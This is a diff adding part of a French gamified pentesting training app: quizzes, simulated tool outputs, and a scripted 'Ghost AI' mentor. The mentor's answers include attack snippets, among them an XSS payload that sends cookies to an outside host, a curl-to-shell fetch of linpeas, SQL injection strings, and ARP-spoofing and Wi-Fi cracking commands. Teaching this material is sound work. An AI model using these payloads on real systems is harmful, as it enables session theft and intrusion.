+    {q:"SUID bit sur un binaire root signifie :",o:["A. Fichier chiffré","B. S'exécute avec les droits du propriétaire (root)","C. Fichier protégé en lecture","D. Binaire signé"],c:1,e:"SUID sur un binaire root = il s'exécute EN ROOT quand tu le lances. Si GTFOBins le liste, tu as root."},
+    {q:"Pass-the-Hash permet de :",o:["A. Cracker un hash","B. S'authentifier sans le password en clair","C. Bypasser SSL","D. Injecter via hash"],c:1,e:"NTLM accepte le hash directement. Avec evil-winrm ou psexec, tu t'authentifies sans jamais cracker le mot de passe."},
+  ],
+};
+
+// ── TERMINAL RESPONSES ──
+const TR={
+  nmap:['Starting Nmap 7.94','Nmap scan report for target (192.168.1.1)','Host is up (0.002s latency).','','PORT     STATE SERVICE    VERSION','22/tcp   open  ssh        OpenSSH 8.2p1','80/tcp   open  http       Apache 2.4.41','443/tcp  open  https      nginx 1.18.0','3306/tcp open  mysql      MySQL 5.7.32','','[✓] Scan terminé: 1 host en 2.43s'],
+  whoami:['root'],id:['uid=0(root) gid=0(root)'],ls:['Documents  exploits  scripts  wordlists  targets.txt'],pwd:['/home/ghost/academy'],
+  subfinder:['api.target.com','cdn.target.com','mail.target.com','vpn.target.com','admin.target.com','[✓] 5 sous-domaines trouvés'],
+  theharvester:['[*] Searching Google, LinkedIn...','[+] admin@target.com','[+] contact@target.com','[+] Hosts: mail.target.com, api.target.com','[✓] Recon terminée'],
+  dig:['10 mail.hackthebox.com.','20 aspmx.l.google.com.','[✓] Serveurs mail trouvés'],
+  whois:['Domain Name: TARGET.COM','Registrant: John Smith','Name Server: NS1.TARGET.COM','[✓] WHOIS extrait'],
+  sqlmap:['sqlmap 1.7 #stable','[INFO] testing connection...','[INFO] GET parameter \'id\' injectable','[*] Databases:','    information_schema','    users_db','    admin_panel','[✓] SQLi confirmée !'],
+  ffuf:['[Status: 200] /admin','[Status: 301] /uploads','[Status: 403] /.git','[Status: 200] /backup.zip','[✓] 4 endpoints trouvés !'],
+  curl:['root:x:0:0:root:/root:/bin/bash','ghost:x:1000:1000::/home/ghost:/bin/bash','[✓] LFI CONFIRMÉE — /etc/passwd accessible !'],
+  dalfox:['[POC][XSS] http://target.com/search?q=<script>alert(1)</script>','[✓] 2 vulnérabilités XSS trouvées !'],
+  sudo:['User ghost may run:','    (ALL) NOPASSWD: /usr/bin/python3','[!] VULNÉRABLE → python3 sans password → check GTFOBins !'],
+  find:['[!] /proc: Permission denied','/usr/bin/sudo','/usr/bin/passwd','/bin/su','[✓] 4 SUID binaries — check GTFOBins !'],
+  mimikatz:['mimikatz 2.2.0 (x64)','User Name    : Administrator','Password     : Sup3rP@ss!','[✓] Credentials dumpés !'],
+  hashcat:['hashcat v6.2.6','[FOUND] PASSWORD123','Status: Cracked','[✓] Password trouvé : PASSWORD123'],
+  hashid:["[+] MD5 [Hashcat Mode: 0]","[✓] Type: MD5 — hashcat -m 0"],
+  john:['letmein (admin)','[✓] Password cracké : letmein'],
+  ollama:['>>> Chargement llama3...','Ghost AI (local): Prêt. Quel exploit analyser ?','Modèle: llama3 | Local: 100% | Zéro cloud'],
+  help:['Commandes : nmap, subfinder, theHarvester, whois, dig','           sqlmap, ffuf, curl, dalfox','           sudo, find, mimikatz','           hashcat, hashid, john, ollama','','Clique ▶ RUN pour lancer directement'],
+  clear:['__CLEAR__'],
+};
+
+// ── TERMINAL ──
+function runCmd(cmd,mod){
+  if(!cmd||!cmd.trim())return;
+  const out=document.getElementById('term-'+mod);
+  if(!out)return;
+  const e=document.createElement('div');e.className='t cmd';e.textContent=cmd;out.appendChild(e);
+  const key=Object.keys(TR).find(k=>cmd.toLowerCase().split(' ')[0].includes(k));
+  const lines=key?TR[key]:[`-bash: ${cmd.split(' ')[0]}: not found (try 'help')`];
+  if(lines[0]==='__CLEAR__'){out.innerHTML='';return;}
+  lines.forEach((l,i)=>setTimeout(()=>{
+    const d=document.createElement('div');
+    d.className='t'+(l.startsWith('[✓]')?' ok':l.startsWith('[!]')?' warn':(l.startsWith('[*]')||l.startsWith('[+]')||l.startsWith('[INFO]'))?' info':l.startsWith('-bash')?' err':'');
+    d.textContent=l;out.appendChild(d);out.scrollTop=out.scrollHeight;
+  },i*25));
+  addXP(10,mod);cmdCount++;document.getElementById('sh-cmd').textContent=cmdCount;
+  setTimeout(()=>{out.scrollTop=out.scrollHeight;},lines.length*30);
+}
+
+// ── XP ──
+function addXP(amount,mod){
+  xp+=amount;
+  document.getElementById('xpFill').style.width=Math.min(100,(xp%500)/500*100)+'%';
+  document.getElementById('xpNum').textContent=xp+' XP';
+  document.getElementById('sh-xp').textContent=xp;
+  document.getElementById('sk-xp').textContent=xp;
+  let rank=ranks[0][1];
+  for(const[t,n]of ranks)if(xp>=t)rank=n;
+  document.getElementById('rankLbl').textContent=rank;
+  if(mod&&skillMod[mod]!==undefined)skills[skillMod[mod]].v=Math.min(100,skills[skillMod[mod]].v+5);
+  renderSkills();
+}
+
+// ── PAGE ──
+function goPage(id,btn){
+  document.querySelectorAll('.page').forEach(p=>{p.classList.remove('active');});
+  document.getElementById('page-'+id).classList.add('active');
+  document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('scrollArea').scrollTop=0;
+  document.getElementById('aiBar').classList.toggle('hidden',id!=='ai');
+  if(id==='skills')renderSkills();
+}
+
+// ── SEG TABS ──
+function segTab(btn,mod,tab){
+  btn.closest('.seg-tabs').querySelectorAll('.seg-tab').forEach(t=>t.classList.remove('active'));
+  btn.classList.add('active');
+  ['theory','quiz','lab'].forEach(t=>{
+    const el=document.getElementById(`${mod}-${t}`);
+    if(el)el.classList.toggle('hidden',t!==tab);
+  });
+}
+
+// ── QUIZ ──
+function buildQuizzes(){
+  Object.keys(QD).forEach(mod=>{
+    const c=document.getElementById(`${mod}-qcards`);
+    if(!c)return;
+    QD[mod].forEach((q,i)=>{
+      const opts=q.o.map((o,j)=>`<button class="quiz-opt" onclick="answer('${mod}',${i},${j},this)"><span class="opt-ltr">${String.fromCharCode(65+j)}.</span>${o.slice(3)}</button>`).join('');
+      c.innerHTML+=`<div class="quiz-card" id="qc-${mod}-${i}"><div class="quiz-head">🎯 Q${i+1}/${QD[mod].length}</div><div class="quiz-body"><div class="quiz-q">${q.q}</div><div class="quiz-opts">${opts}</div><div class="quiz-fb" id="qf-${mod}-${i}"></div></div></div>`;
+    });
+  });
+}
+function answer(mod,qi,sel,btn){
+  const q=QD[mod][qi];
+  const card=document.getElementById(`qc-${mod}-${qi}`);
+  card.querySelectorAll('.quiz-opt').forEach((o,j)=>{o.classList.add('disabled');if(j===q.c)o.classList.add('correct');});
+  const fb=document.getElementById(`qf-${mod}-${qi}`);
+  totalQ++;
+  if(sel===q.c){btn.classList.add('correct');fb.className='quiz-fb show good';fb.innerHTML='✓ Correct ! '+q.e;addXP(30,mod);totalC++;skills[skillMod[mod]||0].v=Math.min(100,skills[skillMod[mod]||0].v+15);}
+  else{btn.classList.add('wrong');fb.className='quiz-fb show bad';fb.innerHTML='✗ Incorrect. '+q.e;addXP(5,mod);}
+  document.getElementById('sh-q').textContent=totalC;
+  document.getElementById('sk-c').textContent=totalC;
+  document.getElementById('sk-s').textContent=totalQ>0?Math.round(totalC/totalQ*100)+'%':'0%';
+}
+
+// ── SKILLS ──
+function renderSkills(){
+  const g=document.getElementById('skillGrid');if(!g)return;
+  g.innerHTML=skills.map(s=>`<div class="sk-node" style="border-top:2px solid ${s.c}"><div class="sk-icon">${s.i}</div><div class="sk-name">${s.n}</div><div class="sk-lvl">LVL ${Math.floor(s.v/20)+1} · ${s.v}%</div><div class="sk-bar"><div class="sk-fill" style="width:${s.v}%;background:${s.c};box-shadow:0 0 6px ${s.c}"></div></div></div>`).join('');
+}
+
+// ── HOME MODULE LIST ──
+function buildHome(){
+  const list=document.getElementById('homeModList');
+  const mods=[
+    {id:'recon',icon:'🔍',tag:'MODULE 01',title:'Reconnaissance',meta:'5 leçons · 2h30',nav:'recon'},
+    {id:'web',icon:'💉',tag:'MODULE 03',title:'Web Exploitation',meta:'7 leçons · 4h00',nav:'web'},
+    {id:'post',icon:'🔓',tag:'MODULE 04',title:'Post-Exploitation',meta:'6 leçons · 3h30',nav:'post'},
+    {id:'ai',icon:'🤖',tag:'GHOST AI',title:'AI Mentor',meta:'Illimité · 24/7',nav:'ai'},
+  ];
+  mods.forEach(m=>{
+    const d=document.createElement('div');
+    d.className='home-mod-card';
+    d.innerHTML=`<div class="home-mod-icon">${m.icon}</div><div class="home-mod-info"><div class="home-mod-tag">${m.tag}</div><div class="home-mod-title">${m.title}</div><div class="home-mod-meta">${m.meta}</div></div><div class="home-mod-arrow">›</div>`;
+    d.onclick=()=>{
+      const btn=document.querySelector(`.nav-btn[onclick*="goPage('${m.nav}'"]`);
+      if(btn)btn.click();
+    };
+    list.appendChild(d);
+  });
+}
+
+// ── GHOST AI (local engine) ──
+const GHOST_KB=[
+  {k:['nmap','scan','port'],r:`<strong style="color:var(--cyan)">NMAP — Commandes clés :</strong><br><br>Scan rapide : <code>nmap -sV -sC -O -T4 &lt;IP&gt;</code><br>Tous les ports : <code>nmap -p- --min-rate=5000 -sV &lt;IP&gt;</code><br>Scripts vulns : <code>nmap --script vuln &lt;IP&gt;</code><br><br>⚡ Commence toujours par le scan rapide, puis -p- pour ne rien rater.`},
+  {k:['sql','injection','sqli','sqlmap'],r:`<strong style="color:var(--cyan)">SQL INJECTION :</strong><br><br>Test manuel : <code>' OR 1=1-- -</code><br>UNION : <code>' UNION SELECT null,null,null-- -</code><br>SQLmap : <code>sqlmap -u "http://target/?id=1" --dbs --batch</code><br>Dump table : <code>sqlmap -u "..." -D users_db -T users --dump</code><br><br>⚡ Blind SQLi : ajoute <code>--technique=B</code> si pas de résultat visible.`},
+  {k:['xss','cross site','script','payload'],r:`<strong style="color:var(--cyan)">XSS :</strong><br><br>Basique : <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code><br>Bypass : <code>&lt;img src=x onerror=alert(1)&gt;</code><br>Steal cookies : <code>&lt;script&gt;fetch('https://toi.com/?c='+document.cookie)&lt;/script&gt;</code><br>Auto : <code>dalfox url "http://target.com/search?q=test"</code><br><br>⚡ XSS Stored &gt; Reflected — cherche formulaires, commentaires, champs de recherche.`},
+  {k:['privesc','privilege','sudo','suid','root'],r:`<strong style="color:var(--cyan)">LINUX PRIVESC :</strong><br><br><code>sudo -l</code> → binaires sans password<br><code>find / -perm -4000 -type f 2>/dev/null</code> → SUID<br><code>cat /etc/crontab</code> → cron jobs<br>Audit auto : <code>curl -L .../linpeas.sh | sh</code><br><br>⚡ GTFOBins.github.io pour exploiter SUID/sudo. Toujours la première ref.`},
+  {k:['mitm','arp','réseau','network','wifi','wpa'],r:`<strong style="color:var(--cyan)">RÉSEAU :</strong><br><br>MITM : <code>echo 1 > /proc/sys/net/ipv4/ip_forward</code><br><code>arpspoof -i eth0 -t &lt;VICTIME&gt; &lt;GATEWAY&gt;</code><br>Wi-Fi : <code>airmon-ng start wlan0</code> → <code>airodump-ng wlan0mon</code><br>Crack : <code>hashcat -m 22000 capture.hc22000 rockyou.txt</code><br><br>⚡ Bettercap = tout-en-un MITM moderne.`},
+  {k:['hash','hashcat','crack','john','md5','sha'],r:`<strong style="color:var(--cyan)">HASH CRACKING :</strong><br><br>Identifier : <code>hashid &lt;HASH&gt;</code><br>MD5 : <code>hashcat -m 0 hash.txt rockyou.txt</code><br>NTLM : <code>hashcat -m 1000 hash.txt rockyou.txt</code><br>bcrypt : <code>hashcat -m 3200 hash.txt rockyou.txt</code><br>Avec règles : <code>hashcat -m 0 hash.txt rockyou.txt -r best64.rule</code><br><br>⚡ GPU = 100x plus rapide. Hashcat exploite le GPU nativement.`},
+  {k:['jwt','token','json web'],r:`<strong style="color:var(--cyan)">JWT ATTACKS :</strong><br><br>1. <strong>alg:none</strong> — change l'algo en "none", supprime la signature<br>2. <strong>Brute force secret</strong> : <code>hashcat -a 0 -m 16500 token.jwt rockyou.txt</code><br>3. <strong>RS256→HS256</strong> : signe avec la clé publique comme secret HMAC<br><br>⚡ Utilise jwt.io pour décoder et jwt_tool pour automatiser.`},
+  {k:['ctf','hackthebox','tryhackme','compétition','flag'],r:`<strong style="color:var(--cyan)">STRATÉGIE CTF :</strong><br><br>🌐 Web → Burp + ffuf + SQLmap + XSS<br>🔐 Crypto → identifier algo, chercher CVE, CyberChef<br>⚙️ Pwn → checksec, GDB+pwndbg, pwntools<br>🔍 Forensic → strings, binwalk, volatility, Wireshark<br>🔁 Reverse → Ghidra, ltrace/strace, angr<br><br>⚡ Parcours : TryHackMe → HTB Academy → HTB machines → CTF compétitions.`},
+  {k:['burp','proxy','intercept'],r:`<strong style="color:var(--cyan)">BURP SUITE :</strong><br><br>Proxy : <code>127.0.0.1:8080</code><br>Repeater → rejoue et modifie des requêtes<br>Intruder → fuzzing/brute force automatisé<br>Decoder → encode/décode URL, base64, hex<br><br>⚡ Burp Community (gratuit) suffit pour 90% des CTF web.`},
+  {k:['reverse','ghidra','gdb','binaire','binary','elf'],r:`<strong style="color:var(--cyan)">REVERSE ENGINEERING :</strong><br><br><code>file binary</code> → type<br><code>strings binary | grep -i flag</code> → strings cachées<br><code>ltrace ./binary</code> → appels libc<br><code>objdump -d binary | less</code> → désassemblage<br>Décompilation : <strong>Ghidra</strong> (gratuit NSA)<br><br>⚡ 30% des CTF Reverse se résolvent avec strings seul — toujours commencer là.`},
+];
+function ghostAI(q){
+  const ql=q.toLowerCase();
+  let best=null,score=0;
+  for(const e of GHOST_KB){const s=e.k.reduce((a,k)=>a+(ql.includes(k)?1:0),0);if(s>score){score=s;best=e;}}
+  if(best&&score>0)return best.r;
+  return `<strong style="color:var(--cyan)">Ghost AI :</strong><br><br>Pour "<em>${q}</em>", commence par identifier le contexte :<br><br>• CTF Web → Burp + ffuf + SQLmap<br>• Réseau → tcpdump/Wireshark puis MITM<br>• Binaire → strings + GDB + Ghidra<br>• Privesc → sudo -l + find SUID + linpeas<br><br>⚡ Mots-clés précis : <code>nmap</code> <code>SQLi</code> <code>XSS</code> <code>privesc</code> <code>BOF</code> <code>JWT</code> <code>wifi</code> <code>CTF</code>`;
+}
+function sendAI(){
+  const inp=document.getElementById('aiInput');
+  const snd=document.getElementById('aiSnd');
+  const msgs=document.getElementById('aiMessages');
+  const text=inp.value.trim();if(!text)return;
+  msgs.innerHTML+=`<div class="ai-msg user-msg"><div class="user-bbl">${text}</div></div>`;
+  inp.value='';snd.disabled=true;
+  const tid='t'+Date.now();
+  msgs.innerHTML+=`<div class="ai-msg" id="${tid}"><div class="ai-av">👾</div><div class="ai-bbl"><span class="typing"><span>●</span><span>●</span><span>●</span></span></div></div>`;
+  msgs.lastElementChild.scrollIntoView({behavior:'smooth'});
+  setTimeout(()=>{
+    const reply=ghostAI(text);
+    document.getElementById(tid).remove();
+    msgs.innerHTML+=`<div class="ai-msg"><div class="ai-av">👾</div><div class="ai-bbl">${reply}</div></div>`;
+    addXP(20,'ai');snd.disabled=false;
+    msgs.lastElementChild.scrollIntoView({behavior:'smooth'});
+  },700+Math.random()*500);
+}
+
+// ── INIT ──
+buildQuizzes();buildHome();renderSkills();
+</script>
+</body>
+</html>
